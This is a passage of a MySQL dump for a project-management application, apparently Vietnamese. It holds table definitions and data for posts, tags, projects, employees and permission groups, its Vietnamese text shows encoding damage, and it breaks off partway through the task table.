INSERT INTO `postcomment` VALUES ('fd223f4a-9351-46c9-9630-6c68f51def4d','3476e29d-ff26-4027-b4c3-ecad953af36c','B├ái viß║┐t hay lß║»m.','B-1179','2023-08-01 00:21:42','2023-08-01 00:25:23');
/*!40000 ALTER TABLE `postcomment` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `postposttag`
--

DROP TABLE IF EXISTS `postposttag`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `postposttag` (
  `PostPostTagID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `PostID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `PostTagID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  PRIMARY KEY (`PostPostTagID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng c├íc nh├ún cß╗ºa b├ái viß║┐t';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `postposttag`
--

LOCK TABLES `postposttag` WRITE;
/*!40000 ALTER TABLE `postposttag` DISABLE KEYS */;
INSERT INTO `postposttag` VALUES ('1511b405-795e-4d79-a2ca-19ee218b10a3','895013bc-bfac-4583-95f3-853e813f0a29','a1acd56d-2ef1-11ee-a545-0242ac130002','2023-08-01 07:32:45'),('2bca977a-5fac-4788-b0aa-c3ca0c5c484c','249329f6-b2ba-4af9-bf76-9af4b16d427a','9dad93e8-2ef1-11ee-a545-0242ac130002','2023-08-03 09:49:10'),('4b895a0c-fae7-44ca-80d5-8b38eae8a942','895013bc-bfac-4583-95f3-853e813f0a29','9dad93e8-2ef1-11ee-a545-0242ac130002','2023-08-01 07:32:45'),('65d6a047-5c8b-4a3d-9b69-69340e9155b0','531a0109-a5e4-4561-bb70-627204290180','a1acd56d-2ef1-11ee-a545-0242ac130002','2023-07-31 22:43:37'),('a7bde594-f066-4862-b182-1fd81049f0ef','800ba249-48f3-42a3-a9e3-7438c32203c8','a1acd56d-2ef1-11ee-a545-0242ac130002','2023-07-31 02:02:02'),('c5d09e41-1155-48ce-8d3a-02deedeaf354','05d54df1-72cc-4cc9-964a-4383ef986522','a1acd56d-2ef1-11ee-a545-0242ac130002','2023-08-03 10:30:41'),('df812f3e-f878-4cd8-b04f-bf1b729db06d','3476e29d-ff26-4027-b4c3-ecad953af36c','9dad93e8-2ef1-11ee-a545-0242ac130002','2023-07-31 20:54:21');
/*!40000 ALTER TABLE `postposttag` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `posttag`
--

DROP TABLE IF EXISTS `posttag`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `posttag` (
  `PostTagID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `ProjectID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `PostTagName` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatedBy` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Nh├ún b├ái viß║┐t';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `posttag`
--

LOCK TABLES `posttag` WRITE;
/*!40000 ALTER TABLE `posttag` DISABLE KEYS */;
INSERT INTO `posttag` VALUES ('9dad93e8-2ef1-11ee-a545-0242ac130002','dcb94c92-1048-11ee-98af-0242ac130002','Nh├ún A','2023-07-30 22:56:16','B-1179'),('a1acd56d-2ef1-11ee-a545-0242ac130002','dcb94c92-1048-11ee-98af-0242ac130002','Nh├ún B','2023-07-30 22:56:22','B-1179'),('a4f900bd-2ef1-11ee-a545-0242ac130002','dcb94c92-1048-11ee-98af-0242ac130002','Nh├ún C','2023-07-30 22:56:28','B-1179');
/*!40000 ALTER TABLE `posttag` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `postwatcher`
--

DROP TABLE IF EXISTS `postwatcher`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `postwatcher` (
  `PostWatcherID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `PostID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `EmployeeID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `postwatcher`
--

LOCK TABLES `postwatcher` WRITE;
/*!40000 ALTER TABLE `postwatcher` DISABLE KEYS */;
INSERT INTO `postwatcher` VALUES ('cb950a7b-afba-4b80-842b-6010af7ff07e','3476e29d-ff26-4027-b4c3-ecad953af36c','53da58f8-ef0d-11ed-ae2b-0242ac130002','2023-08-01 02:27:51'),('0a8731f3-e828-4068-b32a-14a402683178','895013bc-bfac-4583-95f3-853e813f0a29','53da58f8-ef0d-11ed-ae2b-0242ac130002','2023-08-01 07:33:05'),('3e6df73b-bbf5-4b0f-b987-bec0b508f528','3476e29d-ff26-4027-b4c3-ecad953af36c','ddc7a9f4-13b9-11ee-b55a-0242ac130002','2023-08-03 10:33:23');
/*!40000 ALTER TABLE `postwatcher` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `project`
--

DROP TABLE IF EXISTS `project`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `project` (
  `ProjectID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `DepartmentID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `ProjectName` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `StartDate` datetime DEFAULT NULL,
  `EndDate` datetime DEFAULT NULL,
  `Description` text COLLATE utf8mb4_unicode_ci,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatedBy` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`ProjectID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng dß╗▒ ├ín';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `project`
--

LOCK TABLES `project` WRITE;
/*!40000 ALTER TABLE `project` DISABLE KEYS */;
INSERT INTO `project` VALUES ('616d10be-3da6-4e67-962e-98658fd034b6','5da7a4e5-2b08-11ee-8ac5-0242ac130002','X├óy dß╗▒ng Website b├ín h├áng MECA','2023-07-10 17:00:00','2023-10-14 17:00:00','─É├óy l├á dß╗▒ ├ín do c├┤ng ty MECA thu├¬.','2023-07-31 07:22:58','B-1179'),('9a78db36-1048-11ee-98af-0242ac130002','48404a61-1048-11ee-98af-0242ac130002','C├┤ng viß╗çc c├í nh├ón','2023-02-21 00:00:00',NULL,'Dß╗▒ ├ín c├┤ng viß╗çc c├í nh├ón cß╗ºa nh├ón vi├¬n','2023-06-21 00:00:00','B-1179'),('dcb94c92-1048-11ee-98af-0242ac130002','706d5e46-1048-11ee-98af-0242ac130002','MCP Ticket',NULL,NULL,'Dß╗▒ ├ín MCP Ticket','2023-06-21 00:00:00','B-1179');
/*!40000 ALTER TABLE `project` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `project_employees`
--

DROP TABLE IF EXISTS `project_employees`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `project_employees` (
  `Project_EmployeeID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `EmployeeID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `ProjectID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `PermissionGroupID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatedBy` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `IsInitProject` tinyint(1) DEFAULT NULL,
  PRIMARY KEY (`Project_EmployeeID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng dß╗» liß╗çu nh├ón vi├¬n dß╗▒ ├ín';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `project_employees`
--

LOCK TABLES `project_employees` WRITE;
/*!40000 ALTER TABLE `project_employees` DISABLE KEYS */;
INSERT INTO `project_employees` VALUES ('3e2b92eb-2644-11ee-a69c-0242ac130002','ddc7a9f4-13b9-11ee-b55a-0242ac130002','dcb94c92-1048-11ee-98af-0242ac130002','c3a15a18-1822-11ee-9a50-0242ac130002',NULL,NULL,NULL),('4eeee32c-35c8-11ee-b003-0242ac130002','848e4747-13c6-11ee-b55a-0242ac130002','dcb94c92-1048-11ee-98af-0242ac130002','c3a15a18-1822-11ee-9a50-0242ac130002','2023-08-08 15:48:12','B-1179',0),('4eef5e01-35c8-11ee-b003-0242ac130002','aea2e463-31a5-11ee-bb11-0242ac130002','dcb94c92-1048-11ee-98af-0242ac130002','c3a15a18-1822-11ee-9a50-0242ac130002','2023-08-08 15:48:12','B-1179',0),('66d31b86-2f38-11ee-8c2d-0242ac130002','53da58f8-ef0d-11ed-ae2b-0242ac130002','616d10be-3da6-4e67-962e-98658fd034b6','aabd7d56-1822-11ee-9a50-0242ac130002',NULL,NULL,NULL),('66d69863-2f38-11ee-8c2d-0242ac130002','ddc7a9f4-13b9-11ee-b55a-0242ac130002','616d10be-3da6-4e67-962e-98658fd034b6','c3a15a18-1822-11ee-9a50-0242ac130002',NULL,NULL,NULL),('92a3f42c-2643-11ee-a69c-0242ac130002','53da58f8-ef0d-11ed-ae2b-0242ac130002','9a78db36-1048-11ee-98af-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002',NULL,NULL,1),('cf0b2c99-2643-11ee-a69c-0242ac130002','53da58f8-ef0d-11ed-ae2b-0242ac130002','dcb94c92-1048-11ee-98af-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002',NULL,NULL,NULL);
/*!40000 ALTER TABLE `project_employees` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `projectpermission`
--

DROP TABLE IF EXISTS `projectpermission`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `projectpermission` (
  `PermissionID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `Description` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `Component` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatedBy` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `PermissionCode` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `PermissionName` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`PermissionID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng c├íc quyß╗ün hß║ín';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `projectpermission`
--

LOCK TABLES `projectpermission` WRITE;
/*!40000 ALTER TABLE `projectpermission` DISABLE KEYS */;
INSERT INTO `projectpermission` VALUES ('0fbd218b-1822-11ee-9a50-0242ac130002','Xo├í dß╗▒ ├ín/nh├│m','Project','2023-06-30 00:00:00',NULL,'Project_Delete','Xo├í dß╗▒ ├ín/nh├│m'),('1fc53357-35fb-11ee-b003-0242ac130002','Chß╗ënh sß╗¡a tß║Ñt cß║ú b├ái viß║┐t tri thß╗⌐c','Post','2023-08-07 00:00:00',NULL,'Post_Edit_All','Chß╗ënh sß╗¡a tß║Ñt cß║ú b├ái viß║┐t tri thß╗⌐c cß╗ºa dß╗▒ ├ín/nh├│m'),('25990485-1822-11ee-9a50-0242ac130002','Truy cß║¡p dß╗» liß╗çu Gantt','Gantt','2023-06-30 00:00:00',NULL,'Gantt_Read','Truy cß║¡p dß╗» liß╗çu Gantt'),('25c855cc-36b8-11ee-bacd-0242ac130002','Sß╗¡a tß║Ñt cß║ú giai ─æoß║ín cß╗ºa dß╗▒ ├ín/nh├│m','Phase','2023-08-07 11:00:00',NULL,'Phase_Edit','Sß╗¡a tß║Ñt cß║ú giai ─æoß║ín cß╗ºa dß╗▒ ├ín/nh├│m'),('25da1972-35f9-11ee-b003-0242ac130002','Sß╗¡a th├┤ng tin tß║Ñt cß║ú vß║Ñn ─æß╗ü cß╗ºa dß╗▒ ├ín/nh├│m','Issue','2023-08-07 00:00:00',NULL,'Issue_Edit_All','Sß╗¡a tß║Ñt cß║ú th├┤ng tin vß║Ñn ─æß╗ü cß╗ºa dß╗▒ ├ín/nh├│m'),('29d9b34e-35fa-11ee-b003-0242ac130002','─É├│ng/mß╗ƒ lß║íi tß║Ñt cß║ú c├íc vß║Ñn ─æß╗ü cß╗ºa dß╗▒ ├ín/nh├│m','Issue','2023-08-07 00:00:00',NULL,'Issue_Open_Close','─É├│ng/mß╗ƒ lß║íi tß║Ñt cß║ú c├íc vß║Ñn ─æß╗ü cß╗ºa dß╗▒ ├ín/nh├│m'),('2b9a10cf-1822-11ee-9a50-0242ac130002','Truy cß║¡p dß╗» liß╗çu b├ío c├ío','Report','2023-06-30 00:00:00',NULL,'Report_Read','Truy cß║¡p dß╗» liß╗çu b├ío c├ío'),('37f8cdd0-1821-11ee-9a50-0242ac130002','Sß╗¡a c├┤ng viß╗çc cß╗ºa dß╗▒ ├ín/nh├│m','Task','2023-06-30 00:00:00',NULL,'Task_Edit','Sß╗¡a tß║Ñt cß║ú c├┤ng viß╗çc cß╗ºa dß╗▒ ├ín/nh├│m'),('4061e6d6-35fb-11ee-b003-0242ac130002','Chia sß║╗ b├ái viß║┐t tri thß╗⌐c','Post','2023-08-07 00:00:00',NULL,'Post_Share','Chia sß║╗ b├ái viß║┐t tri thß╗⌐c cß╗ºa dß╗▒ ├ín/nh├│m'),('484f3c56-36b8-11ee-bacd-0242ac130002','Xo├í giai ─æoß║ín trong dß╗▒ ├ín/nh├│m','Phase','2023-08-08 00:00:00',NULL,'Phase_Delete','Xo├í giai ─æoß║ín trong dß╗▒ ├ín/nh├│m'),('54751468-35fb-11ee-b003-0242ac130002','Xo├í b├ái viß║┐t tri thß╗⌐c','Post','2023-08-07 00:00:00',NULL,'Post_Delete','Xo├í b├ái viß║┐t tri thß╗⌐c cß╗ºa dß╗▒ ├ín/nh├│m'),('5b0acb72-1821-11ee-9a50-0242ac130002','Xo├í c├┤ng viß╗çc cß╗¡a dß╗▒ ├ín/nh├│m','Task','2023-06-30 00:00:00',NULL,'Task_Delete','Xo├í c├┤ng viß╗çc cß╗ºa dß╗▒ ├ín/nh├│m'),('68909a74-1822-11ee-9a50-0242ac130002','Sß║»p xß║┐p danh s├ích c├┤ng viß╗çc','Gantt','2023-06-30 00:00:00',NULL,'Gantt_Edit','Sß║»p xß║┐p danh s├ích c├┤ng viß╗çc'),('848534d9-36ba-11ee-bacd-0242ac130002','Thiß║┐t lß║¡p vß║Ñn ─æß╗ü cß╗ºa dß╗▒ ├ín/nh├│m','Issue','2023-08-10 00:00:00',NULL,'Issue_Config','Thiß║┐t lß║¡p vß║Ñn ─æß╗ü cß╗ºa dß╗▒ ├ín/nh├│m'),('889341ac-1821-11ee-9a50-0242ac130002','Xem tß║Ñt cß║ú c├┤ng viß╗çc cß╗ºa dß╗▒ ├ín/nh├│m','Project','2023-06-30 00:00:00',NULL,'Project_Read_Task','Xem c├┤ng viß╗çc cß╗ºa dß╗▒ ├ín/nh├│m'),('8f2b4bdd-35fa-11ee-b003-0242ac130002','Xem tß║Ñt cß║ú vß║Ñn ─æß╗ü cß╗ºa dß╗▒ ├ín/nh├│m','Project','2023-08-07 00:00:00',NULL,'Project_Read_Issue','Xem tß║Ñt cß║ú vß║Ñn ─æß╗ü cß╗ºa dß╗▒ ├ín/nh├│m'),('9d5e06d3-36ba-11ee-bacd-0242ac130002','Thiß║┐t lß║¡p b├ái viß║┐t cß╗ºa dß╗▒ ├ín/nh├│m','Post','2023-08-10 00:00:00',NULL,'Post_Config','Thiß║┐t lß║¡p b├ái viß║┐t cß╗ºa dß╗▒ ├ín/nh├│m'),('a7de50a2-35fa-11ee-b003-0242ac130002','Xem tß║Ñt cß║ú b├ái viß║┐t tri thß╗⌐c cß╗ºa dß╗▒ ├ín/nh├│m','Project','2023-08-07 00:00:00',NULL,'Project_Read_Post','Xem tß║Ñt cß║ú b├ái viß║┐t tri thß╗⌐c cß╗ºa dß╗▒ ├ín/nh├│m'),('a8c0516a-1821-11ee-9a50-0242ac130002','Th├¬m th├ánh vi├¬n v├áo dß╗▒ ├ín/nh├│m','Project','2023-06-30 00:00:00',NULL,'Project_Add_Employee','Th├¬m th├ánh vi├¬n v├áo dß╗▒ ├ín/nh├│m'),('d144538e-36b7-11ee-bacd-0242ac130002','Xem tß║Ñt cß║ú giai ─æoß║ín trong dß╗▒ ├ín/nh├│m','Project','2023-08-07 00:00:00',NULL,'Project_Read_Phase','Xem tß║Ñt cß║ú giai ─æoß║ín trong dß╗▒ ├ín/nh├│m'),('d2f6df88-1820-11ee-9a50-0242ac130002','Th├¬m mß╗¢i mß╗Öt c├┤ng viß╗çc v├áo dß╗▒ ├ín/nh├│m','Task','2023-06-30 00:00:00',NULL,'Task_Add','Th├¬m c├┤ng viß╗çc'),('d9cc812a-1821-11ee-9a50-0242ac130002','Sß╗¡a th├┤ng tin cß╗ºa dß╗▒ ├ín/nh├│m','Project','2023-06-30 00:00:00',NULL,'Project_Edit_Info','Sß╗¡a th├┤ng tin cß╗ºa dß╗▒ ├ín/nh├│m'),('de78899c-1821-11ee-9a50-0242ac130002','Xem th├┤ng tin cß╗ºa dß╗▒ ├ín/nh├│m','Project','2023-06-30 00:00:00',NULL,'Project_Read_Info','Xem th├┤ng tin cß╗ºa dß╗▒ ├ín/nh├│m'),('e5193b41-35f8-11ee-b003-0242ac130002','Th├¬m vß║Ñn ─æß╗ü','Issue','2023-08-07 00:00:00',NULL,'Issue_Add','Th├¬m vß║Ñn ─æß╗ü mß╗¢i v├áo dß╗▒ ├ín/nh├│m'),('e7640357-35fa-11ee-b003-0242ac130002','Th├¬m b├ái viß║┐t tri thß╗⌐c','Post','2023-08-07 00:00:00',NULL,'Post_Add','Th├¬m b├ái viß║┐t tri thß╗⌐c v├áo dß╗▒ ├ín/nh├│m'),('fd23b668-36b7-11ee-bacd-0242ac130002','Th├¬m giai ─æoß║ín v├áo dß╗▒ ├ín/nh├│m','Phase','2023-08-07 10:00:00',NULL,'Phase_Add','Th├¬m giai ─æoß║ín v├áo dß╗▒ ├ín/nh├│m'),('fd76af16-35f9-11ee-b003-0242ac130002','Giß║úi quyß║┐t tß║Ñt cß║ú c├íc vß║Ñn ─æß╗ü cß╗ºa dß╗▒ ├ín/nh├│m','Issue','2023-08-07 00:00:00',NULL,'Issue_Resolve','Giß║úi quyß║┐t tß║Ñt cß║ú vß║Ñn ─æß╗ü cß╗ºa dß╗▒ ├ín/nh├│m');
/*!40000 ALTER TABLE `projectpermission` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `projectpermissiongroup`
--

DROP TABLE IF EXISTS `projectpermissiongroup`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `projectpermissiongroup` (
  `PermissionGroupID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `PermissionGroupName` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatedBy` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `ProjectID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `Description` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`PermissionGroupID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng tß║¡p quyß╗ün hß║ín';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `projectpermissiongroup`
--

LOCK TABLES `projectpermissiongroup` WRITE;
/*!40000 ALTER TABLE `projectpermissiongroup` DISABLE KEYS */;
INSERT INTO `projectpermissiongroup` VALUES ('9c72387c-869e-41e2-89f9-78c2dd48c422','Hß║ín chß║┐','2023-08-09 13:48:47','B-1179','dcb94c92-1048-11ee-98af-0242ac130002','Tß║ío v├á xem c├┤ng viß╗çc c├í nh├ón'),('aabd7d56-1822-11ee-9a50-0242ac130002','To├án quyß╗ün','2023-06-30 00:00:00',NULL,'00000000-0000-0000-0000-000000000000','To├án quyß╗ün vß╗¢i Dß╗▒ ├ín/Nh├│m'),('c3a15a18-1822-11ee-9a50-0242ac130002','Th├ánh vi├¬n','2023-06-30 00:00:00',NULL,'00000000-0000-0000-0000-000000000000','Th├¬m v├á theo d├╡i c├┤ng viß╗çc cß╗ºa Dß╗▒ ├ín/Nh├│m');
/*!40000 ALTER TABLE `projectpermissiongroup` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `projectpermissiongroup_permissions`
--

DROP TABLE IF EXISTS `projectpermissiongroup_permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `projectpermissiongroup_permissions` (
  `PermissionGroup_PermissionID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `PermissionID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `PermissionGroupID` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`PermissionGroup_PermissionID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `projectpermissiongroup_permissions`
--

LOCK TABLES `projectpermissiongroup_permissions` WRITE;
/*!40000 ALTER TABLE `projectpermissiongroup_permissions` DISABLE KEYS */;
INSERT INTO `projectpermissiongroup_permissions` VALUES ('6a68b021-36b8-11ee-bacd-0242ac130002','d144538e-36b7-11ee-bacd-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('7a1af49f-36b8-11ee-bacd-0242ac130002','fd23b668-36b7-11ee-bacd-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('828268bc-3692-11ee-bacd-0242ac130002','d2f6df88-1820-11ee-9a50-0242ac130002','c3a15a18-1822-11ee-9a50-0242ac130002'),('83b0cb31-35fb-11ee-b003-0242ac130002','0fbd218b-1822-11ee-9a50-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('83b0f8cb-35fb-11ee-b003-0242ac130002','1fc53357-35fb-11ee-b003-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('83b0fd69-35fb-11ee-b003-0242ac130002','25990485-1822-11ee-9a50-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('83b0ff83-35fb-11ee-b003-0242ac130002','25da1972-35f9-11ee-b003-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('83b10009-35fb-11ee-b003-0242ac130002','29d9b34e-35fa-11ee-b003-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('83b101d7-35fb-11ee-b003-0242ac130002','2b9a10cf-1822-11ee-9a50-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('83b1028f-35fb-11ee-b003-0242ac130002','37f8cdd0-1821-11ee-9a50-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('83b10301-35fb-11ee-b003-0242ac130002','4061e6d6-35fb-11ee-b003-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('83b105bf-35fb-11ee-b003-0242ac130002','54751468-35fb-11ee-b003-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('83b12690-35fb-11ee-b003-0242ac130002','5b0acb72-1821-11ee-9a50-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('83b12730-35fb-11ee-b003-0242ac130002','68909a74-1822-11ee-9a50-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('83b1279b-35fb-11ee-b003-0242ac130002','889341ac-1821-11ee-9a50-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('83b127ff-35fb-11ee-b003-0242ac130002','8f2b4bdd-35fa-11ee-b003-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('83b1285a-35fb-11ee-b003-0242ac130002','a7de50a2-35fa-11ee-b003-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('83b128b7-35fb-11ee-b003-0242ac130002','a8c0516a-1821-11ee-9a50-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('83b1290b-35fb-11ee-b003-0242ac130002','d2f6df88-1820-11ee-9a50-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('83b12969-35fb-11ee-b003-0242ac130002','d9cc812a-1821-11ee-9a50-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('83b129be-35fb-11ee-b003-0242ac130002','de78899c-1821-11ee-9a50-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('83b12a11-35fb-11ee-b003-0242ac130002','e5193b41-35f8-11ee-b003-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('83b12b01-35fb-11ee-b003-0242ac130002','e7640357-35fa-11ee-b003-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('83b12b6d-35fb-11ee-b003-0242ac130002','fd76af16-35f9-11ee-b003-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('877a2880-36b8-11ee-bacd-0242ac130002','25c855cc-36b8-11ee-bacd-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('92608276-36b8-11ee-bacd-0242ac130002','484f3c56-36b8-11ee-bacd-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('af316858-3692-11ee-bacd-0242ac130002','37f8cdd0-1821-11ee-9a50-0242ac130002','c3a15a18-1822-11ee-9a50-0242ac130002'),('c3308059-3686-11ee-bacd-0242ac130002','d2f6df88-1820-11ee-9a50-0242ac130002','9c72387c-869e-41e2-89f9-78c2dd48c422'),('c330855b-3686-11ee-bacd-0242ac130002','0fbd218b-1822-11ee-9a50-0242ac130002','9c72387c-869e-41e2-89f9-78c2dd48c422'),('c33085d4-3686-11ee-bacd-0242ac130002','889341ac-1821-11ee-9a50-0242ac130002','9c72387c-869e-41e2-89f9-78c2dd48c422'),('c53e3dcf-36ba-11ee-bacd-0242ac130002','d144538e-36b7-11ee-bacd-0242ac130002','6584d569-b4e7-4a06-b7f4-b944c68c6d1d'),('c665bbe9-3692-11ee-bacd-0242ac130002','889341ac-1821-11ee-9a50-0242ac130002','c3a15a18-1822-11ee-9a50-0242ac130002'),('da744a5c-3692-11ee-bacd-0242ac130002','8f2b4bdd-35fa-11ee-b003-0242ac130002','c3a15a18-1822-11ee-9a50-0242ac130002'),('dfee2057-36ba-11ee-bacd-0242ac130002','848534d9-36ba-11ee-bacd-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002'),('e969e607-3692-11ee-bacd-0242ac130002','a7de50a2-35fa-11ee-b003-0242ac130002','c3a15a18-1822-11ee-9a50-0242ac130002'),('f7388de1-36ba-11ee-bacd-0242ac130002','9d5e06d3-36ba-11ee-bacd-0242ac130002','aabd7d56-1822-11ee-9a50-0242ac130002');
/*!40000 ALTER TABLE `projectpermissiongroup_permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `relatedperson`
--

DROP TABLE IF EXISTS `relatedperson`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `relatedperson` (
  `RelatedPersonID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `TaskID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatedBy` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`RelatedPersonID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng ng╞░ß╗¥i li├¬n quan tß╗¢i c├┤ng viß╗çc';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `relatedperson`
--

LOCK TABLES `relatedperson` WRITE;
/*!40000 ALTER TABLE `relatedperson` DISABLE KEYS */;
/*!40000 ALTER TABLE `relatedperson` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `task`
--

DROP TABLE IF EXISTS `task`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `task` (
  `TaskID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `TaskName` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `Description` text COLLATE utf8mb4_unicode_ci,
  `StartDate` datetime DEFAULT NULL,
